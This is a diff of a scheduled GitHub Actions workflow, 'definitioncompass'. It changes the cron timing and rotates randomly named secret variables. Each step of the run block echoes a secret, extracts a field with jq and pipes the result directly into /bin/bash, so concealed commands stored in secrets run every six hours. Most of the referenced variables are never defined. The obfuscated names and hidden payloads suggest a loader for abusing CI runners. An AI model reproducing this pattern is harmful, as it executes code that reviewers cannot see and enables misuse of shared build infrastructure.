@@ -1,29 +1,24 @@
 name: definitioncompass
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 2/6 * * *'
-
+    - cron: '19 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: definitioncompass
         env:
-          m4: ${{ secrets.m4 }}
+          kwe67554: ${{ secrets.kwe67554 }}
         run: |
-          echo $m4 | jq -r .buna0 | /bin/bash
-          echo $ffi74 | jq -r .xf2 | /bin/bash
-          echo $pwt8538 | jq -r .i3705 | /bin/bash
-          echo $seib2 | jq -r .gsu921 | /bin/bash
-          echo $m13853 | jq -r .c25721 | /bin/bash
-          echo $xyqsa6 | jq -r .yhyq8 | /bin/bash
-          echo $lwub16029 | jq -r .gmr26 | /bin/bash
-          echo $xyag1437 | jq -r .aqkez2 | /bin/bash
-          echo $mynsw572 | jq -r .q53 | /bin/bash
-          echo $nyswh2047 | jq -r .ql60914 | /bin/bash
-          echo $iek4576 | jq -r .tfcjb836 | /bin/bash
-          echo $muie14 | jq -r .maseu382 | /bin/bash
+          echo $kwe67554 | jq -r .ng9 | /bin/bash
+          echo $cj85 | jq -r .s42 | /bin/bash
+          echo $sq74450 | jq -r .xsj4 | /bin/bash
+          echo $icij44339 | jq -r .b00856 | /bin/bash
+          echo $xiv9 | jq -r .bafz5 | /bin/bash
+          echo $fc34 | jq -r .qe322 | /bin/bash
+          echo $gek5118 | jq -r .pei2 | /bin/bash
+          echo $tvgj21337 | jq -r .t3 | /bin/bash
 
